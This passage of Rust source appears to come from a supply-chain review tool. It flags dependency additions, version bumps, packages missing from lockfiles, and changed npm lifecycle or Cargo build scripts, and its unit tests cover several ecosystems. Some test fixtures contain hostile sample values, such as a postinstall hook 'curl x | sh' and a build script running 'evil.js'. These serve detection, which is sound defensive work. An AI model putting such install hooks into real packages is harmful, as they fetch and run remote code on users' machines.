                NodeState::Modified => Some((
                    "dep-changed",
                    format!("\u{201c}{name}\u{201d} version changed {old} → {new} — confirm the bump is intentional."),
                )),
                _ => None,
            },
        ));
    }
    pending.extend(diff_entries(
        &section(&b, "scripts"),
        &section(&a, "scripts"),
        "scripts",
        "Script",
        &mut nodes,
        |state, name, _old, _new| match state {
            NodeState::Added | NodeState::Modified => {
                let verb = if state == NodeState::Added { "added" } else { "changed" };
                // Lifecycle hooks (preinstall/install/postinstall/prepare…) run
                // automatically on `npm install` — that's the supply-chain risk
                // worth the stern wording. An ordinary script (build/test/lint)
                // only runs when explicitly invoked, so keep it proportionate.
                let desc = if is_npm_lifecycle_script(name) {
                    format!(
                        "npm install-lifecycle script \u{201c}{name}\u{201d} was {verb} — it runs automatically on install; confirm the command is intended."
                    )
                } else {
                    format!(
                        "npm script \u{201c}{name}\u{201d} was {verb} — review the shell command it runs."
                    )
                };
                Some(("script-changed", desc))
            }
            _ => None,
        },
    ));

    build_result(
        "package_json",
        "package.json",
        "JSON",
        nodes,
        pending,
        |rule| match rule {
            "dep-not-in-lockfile" => (Severity::High, "Dependency not in lockfile"),
            "dep-added" => (Severity::Medium, "New dependency"),
            "dep-changed" => (Severity::Low, "Dependency version changed"),
            _ => (Severity::Medium, "npm script changed"),
        },
    )
}

/// Shared assembly for every manifest ecosystem: assign node ids, attach flags
/// from the `pending` list, and roll up the added/modified/removed summary into
/// a `FileResult`. `severity_of` maps each rule id to its (severity, label) so a
/// new ecosystem only writes its rule table, not the boilerplate.
fn build_result(
    file_id: &str,
    file_path: &str,
    lang: &str,
    mut nodes: Vec<AstNode>,
    pending: Vec<(usize, &'static str, String)>,
    severity_of: impl Fn(&str) -> (Severity, &'static str),
) -> Option<FileResult> {
    if nodes.is_empty() {
        return None;
    }
    assign_ids(&mut nodes, file_id, "");

    let mut flags = Vec::new();
    for (idx, rule, desc) in pending {
        let node = &mut nodes[idx];
        let flag_id = format!("{rule}@{}", node.id);
        node.flag_id = Some(flag_id.clone());
        let (severity, label) = severity_of(rule);
        flags.push(Flag {
            id: flag_id,
            severity,
            r#type: label.into(),
            desc,
            evidence: None,
            file_id: file_id.into(),
            file_path: file_path.into(),
            node_path: format!(
                "{} › {}",
                node.signature.as_deref().unwrap_or("scripts"),
                node.name
            ),
            node_id: node.id.clone(),
            dismissed: false,
        });
    }

    let (added, modified, removed) = nodes.iter().fold((0u32, 0u32, 0u32), |(a, m, r), n| match n.state {
        NodeState::Added => (a + 1, m, r),
        NodeState::Modified => (a, m + 1, r),
        NodeState::Removed => (a, m, r + 1),
        NodeState::Unchanged => (a, m, r),
    });
    let mut parts = Vec::new();
    if added > 0 {
        parts.push(format!("{added} added"));
    }
    if modified > 0 {
        parts.push(format!("{modified} modified"));
    }
    if removed > 0 {
        parts.push(format!("{removed} removed"));
    }

    let dir = file_path.rsplit_once('/').map_or(String::new(), |(d, _)| format!("{d}/"));
    let name = file_path.rsplit_once('/').map_or(file_path, |(_, n)| n);
    Some(FileResult {
        entry: FileEntry {
            id: file_id.into(),
            name: name.into(),
            dir,
            lang: lang.into(),
            risks: flags.len() as u32,
            summary: parts.join(" · "),
            skipped: false,
            changed_nodes: 0, // computed at assemble
            reviewed_nodes: 0,
            nodes,
        },
        flags,
        skip_marker: None,
    })
}

/// Emit one node per changed entry in a section. `rule` decides whether the
/// change deserves a flag; returns (node index, rule id, description) entries.
fn diff_entries(
    before: &Entries,
    after: &Entries,
    sec: &str,
    kind: &str,
    nodes: &mut Vec<AstNode>,
    mut rule: impl FnMut(NodeState, &str, &str, &str) -> Option<(&'static str, String)>,
) -> Vec<(usize, &'static str, String)> {
    let mut pending = Vec::new();
    let names: BTreeSet<&String> = before.keys().chain(after.keys()).collect();
    for name in names {
        let old = before.get(name);
        let new = after.get(name);
        let (state, before_line, after_line) = match (old, new) {
            (None, Some(v)) => (NodeState::Added, None, Some(vec![entry_line(name, v)])),
            (Some(v), None) => (NodeState::Removed, Some(vec![entry_line(name, v)]), None),
            (Some(o), Some(n)) if o != n => (
                NodeState::Modified,
                Some(vec![entry_line(name, o)]),
                Some(vec![entry_line(name, n)]),
            ),
            _ => continue,
        };
        let idx = nodes.len();
        nodes.push(AstNode {
            id: String::new(),
            kind: kind.into(),
            name: name.clone(),
            signature: Some(sec.to_string()),
            state,
            reviewed: false,
            flag_id: None,
            before: before_line,
            after: after_line,
            children: None,
        });
        if let Some((rule_id, desc)) = rule(
            state,
            name,
            old.map(String::as_str).unwrap_or_default(),
            new.map(String::as_str).unwrap_or_default(),
        ) {
            pending.push((idx, rule_id, desc));
        }
    }
    pending
}

fn entry_line(name: &str, version: &str) -> String {
    format!("\"{name}\": \"{version}\"")
}

#[cfg(test)]
mod tests {
    use super::*;

    fn names(set: &[&str]) -> LockfileNames {
        LockfileNames::Npm(set.iter().map(|s| s.to_string()).collect())
    }

    #[test]
    fn added_dep_missing_from_lockfile_flags_high() {
        let before = r#"{ "dependencies": { "react": "^19.0.0" } }"#;
        let after = r#"{ "dependencies": { "react": "^19.0.0", "jwt-tiny-decode": "^1.0.0" } }"#;
        let lock = names(&["react"]);
        let res = analyze_package_json(Some(before), Some(after), Some(&lock)).unwrap();
        assert_eq!(res.flags.len(), 1);
        assert!(matches!(res.flags[0].severity, Severity::High));
        assert_eq!(res.flags[0].r#type, "Dependency not in lockfile");
        assert!(res.flags[0].desc.contains("jwt-tiny-decode"));
        assert_eq!(res.flags[0].node_path, "dependencies › jwt-tiny-decode");
        assert_eq!(res.entry.nodes.len(), 1, "unchanged react emits no node");
        assert_eq!(res.entry.summary, "1 added");
    }

    #[test]
    fn added_dep_in_lockfile_flags_medium_and_version_change_low() {
        let before = r#"{ "dependencies": { "react": "^18.0.0" } }"#;
        let after = r#"{ "dependencies": { "react": "^19.0.0", "left-pad": "^1.3.0" } }"#;
        let lock = names(&["react", "left-pad"]);
        let res = analyze_package_json(Some(before), Some(after), Some(&lock)).unwrap();
        assert_eq!(res.flags.len(), 2);
        let by_type = |t: &str| res.flags.iter().find(|f| f.r#type == t).unwrap();
        assert!(matches!(by_type("New dependency").severity, Severity::Medium));
        let changed = by_type("Dependency version changed");
        assert!(matches!(changed.severity, Severity::Low));
        assert!(changed.desc.contains("^18.0.0 → ^19.0.0"));
    }

    #[test]
    fn script_changes_flag_medium_and_removals_emit_unflagged_nodes() {
        let before = r#"{ "scripts": { "build": "tsc" }, "dependencies": { "old-dep": "1.0.0" } }"#;
        let after = r#"{ "scripts": { "build": "tsc && node evil.js", "postinstall": "curl x | sh" } }"#;
        let res = analyze_package_json(Some(before), Some(after), None).unwrap();
        let script_flags: Vec<_> = res.flags.iter().filter(|f| f.r#type == "npm script changed").collect();
        assert_eq!(script_flags.len(), 2, "modified build + added postinstall");
        assert!(script_flags.iter().all(|f| matches!(f.severity, Severity::Medium)));
        let removed = res.entry.nodes.iter().find(|n| n.name == "old-dep").unwrap();
        assert!(matches!(removed.state, NodeState::Removed));
        assert!(removed.flag_id.is_none(), "removed dep is shown but not flagged");
    }

    #[test]
    fn npm_ordinary_script_edit_is_proportionate_but_lifecycle_stays_stern() {
        // Appending a flag to a build script (`tsc` → `tsc --verbose`) does not
        // "run arbitrary shell commands during install" — it runs only when
        // invoked. The wording should be proportionate (no install claim) while
        // still flagging the change for review.
        let before = r#"{ "scripts": { "build": "tsc" } }"#;
        let after = r#"{ "scripts": { "build": "tsc --verbose" } }"#;
        let res = analyze_package_json(Some(before), Some(after), None).unwrap();
        let f = &res.flags[0];
        assert_eq!(f.r#type, "npm script changed");
        assert!(matches!(f.severity, Severity::Medium), "still surfaced for review");
        assert!(
            !f.desc.contains("install"),
            "an ordinary build script does not run on install — drop the install claim"
        );
        assert!(f.desc.contains("review"), "still prompts review of the command");

        // A genuine install-lifecycle hook keeps the stern, install-aware wording.
        let after_hook = r#"{ "scripts": { "build": "tsc", "postinstall": "curl x | sh" } }"#;
        let res2 = analyze_package_json(Some(before), Some(after_hook), None).unwrap();
        let hook = res2.flags.iter().find(|f| f.desc.contains("postinstall")).unwrap();
        assert!(matches!(hook.severity, Severity::Medium));
        assert!(
            hook.desc.contains("install"),
            "install-lifecycle hooks run automatically — keep the install warning"
        );
    }

    #[test]
    fn no_lockfile_downgrades_to_new_dependency() {
        let after = r#"{ "dependencies": { "totally-real-pkg": "^1.0.0" } }"#;
        let res = analyze_package_json(None, Some(after), None).unwrap();
        assert_eq!(res.flags[0].r#type, "New dependency", "can't accuse without a lockfile");
    }

    #[test]
    fn text_lockfiles_vouch_loosely() {
        let lock = LockfileNames::Text("left-pad@^1.3.0:\n  version \"1.3.0\"\n".into());
        let after = r#"{ "dependencies": { "left-pad": "^1.3.0", "ghost-pkg": "1.0.0" } }"#;
        let res = analyze_package_json(None, Some(after), Some(&lock)).unwrap();
        let ghost = res.flags.iter().find(|f| f.desc.contains("ghost-pkg")).unwrap();
        assert_eq!(ghost.r#type, "Dependency not in lockfile");
        let ok = res.flags.iter().find(|f| f.desc.contains("left-pad")).unwrap();
        assert_eq!(ok.r#type, "New dependency");
    }

    #[test]
    fn yarn_lock_names_parses_classic_and_berry_entries() {
        let lock = concat!(
            "# THIS IS AN AUTOGENERATED FILE.\n",
            "# yarn lockfile v1\n",
            "\n",
            "left-pad@^1.3.0:\n",
            "  version \"1.3.0\"\n",
            "\n",
            "\"@scope/util@^2.0.0\", \"@scope/util@^2.1.0\":\n",
            "  version \"2.1.4\"\n",
            "\n",
            "\"resolved-from-berry@npm:^4.0.0\":\n",
            "  version: 4.2.0\n",
        );
        let names = yarn_lock_names(lock);
        assert!(names.contains("left-pad"));
        assert!(names.contains("@scope/util"), "scoped names keep their scope");
        assert!(names.contains("resolved-from-berry"), "berry npm: ranges parse");
        assert!(!names.contains("pad"), "no suffix-collision entries");
        assert!(!names.contains("version"), "indented fields are not entries");
    }

    #[test]
    fn pnpm_lock_names_parses_v5_v6_and_v9_package_keys() {
        let v5 = "lockfileVersion: 5.4\n\npackages:\n\n  /left-pad/1.3.0:\n    resolution: {integrity: sha512-x}\n  /@scope/util/2.1.4:\n    dev: false\n";
        let names = pnpm_lock_names(v5);
        assert!(names.contains("left-pad"));
        assert!(names.contains("@scope/util"));

        let v6 = "lockfileVersion: '6.0'\n\npackages:\n\n  /left-pad@1.3.0:\n    resolution: {integrity: sha512-x}\n  '/@scope/util@2.1.4':\n    dev: false\n";
        let names = pnpm_lock_names(v6);
        assert!(names.contains("left-pad"));
        assert!(names.contains("@scope/util"));

        let v9 = "lockfileVersion: '9.0'\n\nimporters:\n\n  .:\n    dependencies:\n      left-pad:\n        specifier: ^1.3.0\n        version: 1.3.0\n\npackages:\n\n  left-pad@1.3.0:\n    resolution: {integrity: sha512-x}\n  '@scope/util@2.1.4':\n    engines: {node: '>=14'}\n";
        let names = pnpm_lock_names(v9);
        assert!(names.contains("left-pad"));
        assert!(names.contains("@scope/util"));
        assert!(
            !names.contains("dependencies") && !names.contains("specifier"),
            "importer fields are not package names"
        );
    }

    #[test]
    fn parsed_lockfiles_do_not_vouch_for_suffix_collisions() {
        // The old substring check let `left-pad@` vouch for a hallucinated
        // `pad`. Parsed entry names match exactly.
        let lock = LockfileNames::Parsed(yarn_lock_names("left-pad@^1.3.0:\n  version \"1.3.0\"\n"));
        let after = r#"{ "dependencies": { "left-pad": "^1.3.0", "pad": "1.0.0" } }"#;
        let res = analyze_package_json(None, Some(after), Some(&lock)).unwrap();
        let ghost = res.flags.iter().find(|f| f.desc.contains("\u{201c}pad\u{201d}")).unwrap();
        assert_eq!(ghost.r#type, "Dependency not in lockfile");
        let ok = res.flags.iter().find(|f| f.desc.contains("left-pad")).unwrap();
        assert_eq!(ok.r#type, "New dependency");
    }

    #[test]
    fn lockfile_names_falls_back_to_text_for_unrecognized_content() {
        let root = std::env::temp_dir().join(format!("drift-lock-test-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&root);
        std::fs::create_dir_all(&root).unwrap();

        std::fs::write(root.join("yarn.lock"), "left-pad@^1.3.0:\n  version \"1.3.0\"\n").unwrap();
        assert!(matches!(lockfile_names(&root), Some(LockfileNames::Parsed(_))));

        // Content the parser can't read anything from → loose text fallback.
        std::fs::write(root.join("yarn.lock"), "  ???\n  indented only\n").unwrap();
        assert!(matches!(lockfile_names(&root), Some(LockfileNames::Text(_))));

        let _ = std::fs::remove_dir_all(&root);
    }

    #[test]
    fn unchanged_or_unparseable_sections_yield_none() {
        let same = r#"{ "dependencies": { "react": "^19.0.0" }, "version": "1.0.0" }"#;
        let bumped = r#"{ "dependencies": { "react": "^19.0.0" }, "version": "1.0.1" }"#;
        assert!(analyze_package_json(Some(same), Some(bumped), None).is_none(), "version churn isn't dep drift");
        assert!(analyze_package_json(Some("{not json"), Some("{not json"), None).is_none());
    }

    #[test]
    fn npm_lock_names_handles_v3_and_nested_packages() {
        let lock = r#"{ "packages": { "": {}, "node_modules/react": {}, "node_modules/a/node_modules/b": {} } }"#;
        let names = npm_lock_names(lock);
        assert!(names.contains("react"));
        assert!(names.contains("b"), "nested package names resolve");
        assert!(!names.contains(""));
    }

    fn vouched(set: &[&str]) -> VouchedNames {
        VouchedNames(set.iter().map(|s| s.to_string()).collect())
    }

    fn flag_types(res: &FileResult) -> Vec<&str> {
        res.flags.iter().map(|f| f.r#type.as_str()).collect()
    }

    // --- Cargo -------------------------------------------------------------

    #[test]
    fn cargo_added_dep_missing_from_lock_flags_high() {
        let before = "[dependencies]\nserde = \"1\"\n";
        let after = "[dependencies]\nserde = \"1\"\ntokioo = \"1\"\n";
        let lock = vouched(&["serde"]);
        let res = analyze_cargo_toml(Some(before), Some(after), Some(&lock)).unwrap();
        assert_eq!(res.flags.len(), 1);
        assert!(matches!(res.flags[0].severity, Severity::High));
        assert_eq!(res.flags[0].r#type, "Dependency not in lockfile");
        assert!(res.flags[0].desc.contains("tokioo"));
        assert_eq!(res.flags[0].node_path, "dependencies › tokioo");
    }

    #[test]
    fn cargo_added_dep_in_lock_is_medium_and_bump_is_low() {
        let before = "[dependencies]\nserde = \"1.0.0\"\n";
        let after = "[dependencies]\nserde = \"1.0.1\"\ntokio = { version = \"1.40\", features = [\"full\"] }\n";
        let lock = vouched(&["serde", "tokio"]);
        let res = analyze_cargo_toml(Some(before), Some(after), Some(&lock)).unwrap();
        let added = res.flags.iter().find(|f| f.r#type == "New dependency").unwrap();
        assert!(matches!(added.severity, Severity::Medium));
        assert!(added.desc.contains("1.40"), "table version spec renders");
        let bump = res.flags.iter().find(|f| f.r#type == "Dependency version changed").unwrap();
        assert!(matches!(bump.severity, Severity::Low));
        assert!(bump.desc.contains("1.0.0 → 1.0.1"));
    }

    #[test]
    fn cargo_idiomatic_manifest_edit_does_not_flag() {
        // A real-world manifest where only non-dependency metadata changes.
        let before = "[package]\nname = \"app\"\nversion = \"0.1.0\"\nedition = \"2021\"\n\n[dependencies]\nserde = \"1\"\nclap = \"4\"\n";
        let after = "[package]\nname = \"app\"\nversion = \"0.2.0\"\nedition = \"2021\"\ndescription = \"now with docs\"\n\n[dependencies]\nserde = \"1\"\nclap = \"4\"\n";
        assert!(
            analyze_cargo_toml(Some(before), Some(after), Some(&vouched(&["serde", "clap"]))).is_none(),
            "version/description churn is not dependency drift"
        );
    }

    #[test]
    fn cargo_target_specific_dep_is_seen() {
        let before = "[dependencies]\nserde = \"1\"\n";
        let after = "[dependencies]\nserde = \"1\"\n\n[target.'cfg(windows)'.dependencies]\nwinapi = \"0.3\"\n";
        let res = analyze_cargo_toml(Some(before), Some(after), Some(&vouched(&["serde"]))).unwrap();
        assert!(res.flags.iter().any(|f| f.desc.contains("winapi")));
    }

    #[test]
    fn cargo_build_script_change_flags_medium() {
        let before = "[package]\nname = \"app\"\nbuild = \"build.rs\"\n\n[dependencies]\nserde = \"1\"\n";
        let after = "[package]\nname = \"app\"\nbuild = \"scripts/evil.rs\"\n\n[dependencies]\nserde = \"1\"\n";
        let res = analyze_cargo_toml(Some(before), Some(after), Some(&vouched(&["serde"]))).unwrap();
        let bs = res.flags.iter().find(|f| f.r#type == "Build script changed").unwrap();
        assert!(matches!(bs.severity, Severity::Medium));
        assert!(bs.desc.contains("scripts/evil.rs"));
    }

    #[test]
    fn cargo_lock_names_parses_package_array_exactly() {
        let lock = "[[package]]\nname = \"serde\"\nversion = \"1.0.0\"\n\n[[package]]\nname = \"left-pad\"\nversion = \"1.0.0\"\n";
        let names = cargo_lock_names(lock);
        assert!(names.contains("serde"));
        assert!(names.contains("left-pad"));
        assert!(!names.contains("pad"), "exact match, no suffix collision");
    }

    #[test]
    fn cargo_path_dependency_is_low_not_lockfile_accusation() {
        // A sibling-crate `path = "../x"` dep resolves inside the workspace —
        // no registry lookup, so no slopsquatting vector. It must NOT get the
        // High "not in lockfile" accusation nor the Medium "verify it's vetted"
        // framing, even when the lockfile doesn't list it by name.
        let before = "[dependencies]\nserde = \"1\"\n";
        let after = "[dependencies]\nserde = \"1\"\nshared-utils = { path = \"../shared-utils\" }\n";
        let lock = vouched(&["serde"]); // sibling crate not (yet) in the lock set
        let res = analyze_cargo_toml(Some(before), Some(after), Some(&lock)).unwrap();
        let local = res.flags.iter().find(|f| f.desc.contains("shared-utils")).unwrap();
        assert!(matches!(local.severity, Severity::Low), "path dep is Low, not High/Medium");
        assert_eq!(local.r#type, "Local dependency added");
        assert!(
            !local.desc.contains("Hallucinated") && !local.desc.contains("lockfile"),
            "no slopsquatting accusation for an in-repo path dep"
        );
        assert!(local.desc.contains("../shared-utils"), "names the resolved path");

        // A `workspace = true` inherited dep is likewise Low.
        let after_ws = "[dependencies]\nserde = \"1\"\nshared-utils = { workspace = true }\n";
        let res_ws = analyze_cargo_toml(Some(before), Some(after_ws), Some(&lock)).unwrap();
        let ws = res_ws.flags.iter().find(|f| f.desc.contains("shared-utils")).unwrap();
        assert!(matches!(ws.severity, Severity::Low));
        assert!(ws.desc.contains("workspace"), "workspace inheritance is named");

        // Sanity: a genuine registry add that isn't vouched still fires High.
        let after_reg = "[dependencies]\nserde = \"1\"\nghost-crate = \"0.1\"\n";
        let res_reg = analyze_cargo_toml(Some(before), Some(after_reg), Some(&lock)).unwrap();
        let ghost = res_reg.flags.iter().find(|f| f.desc.contains("ghost-crate")).unwrap();
        assert!(matches!(ghost.severity, Severity::High), "registry add still accused");
    }

    // --- Go ----------------------------------------------------------------

    #[test]
    fn go_added_require_missing_from_sum_flags_high() {
        let before = "module example.com/app\n\ngo 1.22\n\nrequire (\n\tgithub.com/real/pkg v1.2.3\n)\n";
        let after = "module example.com/app\n\ngo 1.22\n\nrequire (\n\tgithub.com/real/pkg v1.2.3\n\tgithub.com/ghost/typo v0.1.0\n)\n";
        let lock = vouched(&["github.com/real/pkg"]);
        let res = analyze_go_mod(Some(before), Some(after), Some(&lock)).unwrap();
        let ghost = res.flags.iter().find(|f| f.desc.contains("github.com/ghost/typo")).unwrap();
        assert_eq!(ghost.r#type, "Dependency not in lockfile");
        assert!(matches!(ghost.severity, Severity::High));
    }

    #[test]
    fn go_single_line_require_and_bump() {
        let before = "module m\n\nrequire github.com/a/b v1.0.0\n";
        let after = "module m\n\nrequire github.com/a/b v1.1.0\n";
        let res = analyze_go_mod(Some(before), Some(after), Some(&vouched(&["github.com/a/b"]))).unwrap();
        let bump = res.flags.iter().find(|f| f.r#type == "Dependency version changed").unwrap();
        assert!(bump.desc.contains("v1.0.0 → v1.1.0"));
    }

    #[test]
    fn go_idiomatic_edit_does_not_flag() {
        // Only the go directive and a comment change; requires untouched.
        let before = "module m\n\ngo 1.21\n\nrequire github.com/a/b v1.0.0 // indirect\n";
        let after = "module m\n\ngo 1.22\n\nrequire github.com/a/b v1.0.0 // pinned for cve\n";
        assert!(
            analyze_go_mod(Some(before), Some(after), Some(&vouched(&["github.com/a/b"]))).is_none(),
            "go-version and comment churn is not dependency drift"
        );
    }

    #[test]
    fn go_added_indirect_requires_are_low_not_medium() {
        // `go mod tidy` routinely writes a batch of `// indirect` transitive
        // requires, all vouched by go.sum. They aren't a direct developer
        // choice, so they must downgrade to Low — not fire Medium "New
        // dependency" en masse.
        let before = "module m\n\ngo 1.22\n\nrequire (\n\tgithub.com/real/direct v1.0.0\n)\n";
        let after = "module m\n\ngo 1.22\n\nrequire (\n\tgithub.com/real/direct v1.0.0\n)\n\nrequire (\n\tgithub.com/transitive/a v1.1.0 // indirect\n\tgithub.com/transitive/b v2.2.0 // indirect\n\tgithub.com/transitive/c v3.3.0 // indirect\n)\n";
        // go.sum vouches for every added indirect entry.
        let lock = vouched(&[
            "github.com/real/direct",
            "github.com/transitive/a",
            "github.com/transitive/b",
            "github.com/transitive/c",
        ]);
        let res = analyze_go_mod(Some(before), Some(after), Some(&lock)).unwrap();
        let indirect: Vec<_> = res
            .flags
            .iter()
            .filter(|f| f.desc.contains("github.com/transitive/"))
            .collect();
        assert_eq!(indirect.len(), 3, "all three indirect adds produce a flag node");
        assert!(
            indirect.iter().all(|f| matches!(f.severity, Severity::Low)),
            "indirect adds are Low, not Medium"
        );
        assert!(
            indirect.iter().all(|f| f.r#type == "Indirect dependency added"),
            "indirect adds carry the module-graph label, not 'New dependency'"
        );
        assert!(
            indirect.iter().all(|f| f.desc.contains("module graph")),
            "wording attributes the add to the module graph, not a direct choice"
        );
        // A real direct dependency still gets the Medium treatment.
        let after_direct = "module m\n\ngo 1.22\n\nrequire (\n\tgithub.com/real/direct v1.0.0\n\tgithub.com/real/chosen v1.0.0\n)\n";
        let res2 = analyze_go_mod(
            Some(before),
            Some(after_direct),
            Some(&vouched(&["github.com/real/direct", "github.com/real/chosen"])),
        )
        .unwrap();
        let chosen = res2.flags.iter().find(|f| f.desc.contains("github.com/real/chosen")).unwrap();
        assert!(matches!(chosen.severity, Severity::Medium), "direct add stays Medium");
        assert_eq!(chosen.r#type, "New dependency");
    }

    #[test]
    fn go_sum_names_takes_module_paths() {
        let sum = "github.com/a/b v1.0.0 h1:abc=\ngithub.com/a/b v1.0.0/go.mod h1:def=\n";
        let names = go_sum_names(sum);
        assert!(names.contains("github.com/a/b"));
    }

    // --- requirements.txt --------------------------------------------------

    #[test]
    fn requirements_new_dep_is_low_no_lock_claim() {
        let before = "flask==2.0\nrequests>=2.28\n";
        let after = "flask==2.0\nrequests>=2.28\nreqests==1.0\n";
        let res = analyze_requirements_txt(Some(before), Some(after)).unwrap();
        assert_eq!(res.flags.len(), 1);
        assert!(matches!(res.flags[0].severity, Severity::Low));
        assert_eq!(res.flags[0].r#type, "New dependency");
        assert!(res.flags[0].desc.contains("reqests"));
        assert!(res.flags[0].desc.contains("no lockfile"), "honest wording, no accusation");
    }

    #[test]
    fn requirements_idiomatic_file_with_comments_and_options_no_flag() {
        let before = "# app deps\n--index-url https://pypi.org/simple\nflask==2.0  # web\nrequests>=2.28\n";
        let after = "# app deps (reordered, pinned)\n--index-url https://pypi.org/simple\nrequests>=2.28\nflask==2.0  # web framework\n";
        assert!(
            analyze_requirements_txt(Some(before), Some(after)).is_none(),
            "reordering + comment edits are not dependency drift"
        );
    }

    #[test]
    fn requirements_version_bump_is_low_changed() {
        let before = "django==4.0\n";
        let after = "django==4.2\n";
        let res = analyze_requirements_txt(Some(before), Some(after)).unwrap();
        assert_eq!(res.flags[0].r#type, "Dependency version changed");
        assert!(res.flags[0].desc.contains("django==4.0 → django==4.2"));
    }

    #[test]
    fn requirements_marker_only_change_is_not_a_version_change() {
        // Only the PEP 508 environment marker moves; the package and its version
        // constraint are identical. Reporting "version changed" would be
        // factually wrong, so this must produce no flag at all.
        let before = "importlib-metadata==6.0 ; python_version < \"3.12\"\n";
        let after = "importlib-metadata==6.0 ; python_version < \"3.13\"\n";
        assert!(
            analyze_requirements_txt(Some(before), Some(after)).is_none(),
            "a marker-only edit leaves the version unchanged — no version-change flag"
        );

        // But a real version bump alongside a marker is still caught, and the
        // reported spec excludes the marker noise.
        let bumped = "importlib-metadata==6.1 ; python_version < \"3.12\"\n";
        let res = analyze_requirements_txt(Some(before), Some(bumped)).unwrap();
        assert_eq!(res.flags[0].r#type, "Dependency version changed");
        assert!(res.flags[0].desc.contains("==6.0 → "));
        assert!(res.flags[0].desc.contains("==6.1"));
        assert!(!res.flags[0].desc.contains("python_version"), "marker is not part of the spec");
    }

    // --- pyproject.toml ----------------------------------------------------

    #[test]
    fn pyproject_pep621_new_dep_low_without_lock() {
        let before = "[project]\nname = \"app\"\ndependencies = [\"flask>=2.0\"]\n";
        let after = "[project]\nname = \"app\"\ndependencies = [\"flask>=2.0\", \"reqests==1.0\"]\n";
        let res = analyze_pyproject_toml(Some(before), Some(after), None).unwrap();
        assert_eq!(res.flags.len(), 1);
        assert_eq!(res.flags[0].r#type, "New dependency");
        assert!(matches!(res.flags[0].severity, Severity::Low));
        assert!(res.flags[0].desc.contains("reqests"));
    }

    #[test]
    fn pyproject_poetry_lock_vouches_high_for_unknown() {
        let before = "[tool.poetry.dependencies]\npython = \"^3.11\"\nflask = \"^2.0\"\n";
        let after = "[tool.poetry.dependencies]\npython = \"^3.11\"\nflask = \"^2.0\"\nghostpkg = \"^1.0\"\n";
        let lock = vouched(&["flask"]);
        let res = analyze_pyproject_toml(Some(before), Some(after), Some(&lock)).unwrap();
        let ghost = res.flags.iter().find(|f| f.desc.contains("ghostpkg")).unwrap();
        assert_eq!(ghost.r#type, "Dependency not in lockfile");
        assert!(matches!(ghost.severity, Severity::High));
        assert!(!res.flags.iter().any(|f| f.desc.contains("python")), "interpreter constraint isn't a package");
    }

    #[test]
    fn pyproject_idiomatic_metadata_edit_no_flag() {
        let before = "[project]\nname = \"app\"\nversion = \"0.1.0\"\ndependencies = [\"flask>=2.0\"]\n";
        let after = "[project]\nname = \"app\"\nversion = \"0.2.0\"\nauthors = [{name = \"me\"}]\ndependencies = [\"flask>=2.0\"]\n";
        assert!(
            analyze_pyproject_toml(Some(before), Some(after), None).is_none(),
            "metadata churn is not dependency drift"
        );
    }

    // --- Maven pom.xml -----------------------------------------------------

    #[test]
    fn pom_new_dependency_low_no_lock() {
        let before = "<project><dependencies>\n<dependency><groupId>org.real</groupId><artifactId>lib</artifactId><version>1.0</version></dependency>\n</dependencies></project>";
        let after = "<project><dependencies>\n<dependency><groupId>org.real</groupId><artifactId>lib</artifactId><version>1.0</version></dependency>\n<dependency><groupId>org.ghost</groupId><artifactId>typo</artifactId><version>0.1</version></dependency>\n</dependencies></project>";
        let res = analyze_pom_xml(Some(before), Some(after)).unwrap();
        assert_eq!(res.flags.len(), 1);
        assert_eq!(res.flags[0].r#type, "New dependency");
        assert!(matches!(res.flags[0].severity, Severity::Low));
        assert!(res.flags[0].desc.contains("org.ghost:typo"));
    }

    #[test]
    fn pom_idiomatic_version_property_edit_no_dep_change() {
        // Build/property churn outside <dependencies> must not flag.
        let before = "<project>\n<properties><java.version>17</java.version></properties>\n<dependencies>\n<dependency><groupId>org.real</groupId><artifactId>lib</artifactId><version>1.0</version></dependency>\n</dependencies></project>";
        let after = "<project>\n<properties><java.version>21</java.version></properties>\n<dependencies>\n<dependency><groupId>org.real</groupId><artifactId>lib</artifactId><version>1.0</version></dependency>\n</dependencies></project>";
        assert!(
            analyze_pom_xml(Some(before), Some(after)).is_none(),
            "property edits are not dependency drift"
        );
    }

    #[test]
    fn pom_version_bump_is_low_changed() {
        let before = "<project><dependencies><dependency><groupId>g</groupId><artifactId>a</artifactId><version>1.0</version></dependency></dependencies></project>";
        let after = "<project><dependencies><dependency><groupId>g</groupId><artifactId>a</artifactId><version>1.1</version></dependency></dependencies></project>";
        let res = analyze_pom_xml(Some(before), Some(after)).unwrap();
        assert_eq!(res.flags[0].r#type, "Dependency version changed");
        assert!(res.flags[0].desc.contains("1.0 → 1.1"));
    }

    // --- NuGet .csproj -----------------------------------------------------

    #[test]
    fn csproj_new_package_low_without_lock() {
        let before = "<Project><ItemGroup>\n<PackageReference Include=\"Newtonsoft.Json\" Version=\"13.0.1\" />\n</ItemGroup></Project>";
        let after = "<Project><ItemGroup>\n<PackageReference Include=\"Newtonsoft.Json\" Version=\"13.0.1\" />\n<PackageReference Include=\"Ghost.Typo\" Version=\"0.1.0\" />\n</ItemGroup></Project>";
        let res = analyze_csproj("src/App.csproj", Some(before), Some(after), None).unwrap();
        assert_eq!(res.flags.len(), 1);
        assert_eq!(res.flags[0].r#type, "New dependency");
        assert!(matches!(res.flags[0].severity, Severity::Low));
        assert!(res.flags[0].desc.contains("Ghost.Typo"));
        assert_eq!(res.flags[0].file_path, "src/App.csproj", "multi-project repos localize");
    }

    #[test]
    fn csproj_lock_vouches_high_for_unknown() {
        let before = "<Project><ItemGroup>\n<PackageReference Include=\"Newtonsoft.Json\" Version=\"13.0.1\" />\n</ItemGroup></Project>";
        let after = "<Project><ItemGroup>\n<PackageReference Include=\"Newtonsoft.Json\" Version=\"13.0.1\" />\n<PackageReference Include=\"Ghost.Typo\" Version=\"0.1.0\" />\n</ItemGroup></Project>";
        let lock = vouched(&["Newtonsoft.Json"]);
        let res = analyze_csproj("App.csproj", Some(before), Some(after), Some(&lock)).unwrap();
        let ghost = res.flags.iter().find(|f| f.desc.contains("Ghost.Typo")).unwrap();
        assert_eq!(ghost.r#type, "Dependency not in lockfile");
        assert!(matches!(ghost.severity, Severity::High));
    }

    #[test]
    fn csproj_nested_version_element_and_idiomatic_edit() {
        // Version as a child element; only a non-package property changes.
        let before = "<Project><PropertyGroup><TargetFramework>net8.0</TargetFramework></PropertyGroup><ItemGroup>\n<PackageReference Include=\"Serilog\"><Version>3.1.1</Version></PackageReference>\n</ItemGroup></Project>";
